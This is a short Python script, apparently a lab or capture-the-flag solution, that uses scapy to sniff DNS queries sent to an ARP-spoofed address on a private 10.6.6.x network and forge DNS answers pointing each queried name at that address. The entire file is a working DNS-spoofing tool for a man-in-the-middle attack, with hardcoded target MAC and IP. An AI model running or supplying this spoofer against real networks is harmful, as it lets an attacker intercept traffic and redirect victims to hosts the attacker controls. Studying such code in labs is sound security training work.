#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 IP
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our Mac Addr
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
# destination ip we arp spoofed
ipaddr_we_arp_spoofed = "10.6.6.53"
targetmac= "4c:24:57:ab:ed:84"
targetip="10.6.6.35"

def handle_dns_request(packet):

    # Target's requested packet here:
    ip = packet.getlayer(scapy.all.IP)
    udp = packet.getlayer(scapy.all.UDP)

    # Build dns answer
    queried_host = packet.qd.qname[:-1].decode("utf-8")
    resolved_ip = ipaddr_we_arp_spoofed
    dns_answer = scapy.all.DNSRR(
        rrname=queried_host + ".",
        ttl=330,
        type="A",
        rclass="IN",
        rdata=resolved_ip)

    eth = Ether(src=macaddr, dst=targetmac)   # need to replace mac addresses
    ip  = IP(dst=ip.src, src=ip.dst)                          # need to replace IP addresses
    udp = UDP(dport=udp.sport, sport=udp.dport)                             # need to replace ports
    dns = DNS(
        id = packet[scapy.all.DNS].id,
        qr = 1,
        aa = 0,
        rcode = 0,
        qd = packet.qd,
        an = dns_answer
    )
    dns_response = eth / ip / udp / dns
    sendp(dns_response, iface="eth0")

def main():
    berkeley_packet_filter = " and ".join( [
        "udp dst port 53",                              # dns
        "udp[10] & 0x80 = 0",                           # dns request
        "dst host {}".format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
        "ether dst host {}".format(macaddr)             # our macaddress since we spoofed the ip to our mac
    ] )

    # sniff the eth0 int without storing packets in memory and stopping after one dns request
    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=1)

if __name__ == "__main__":
    main()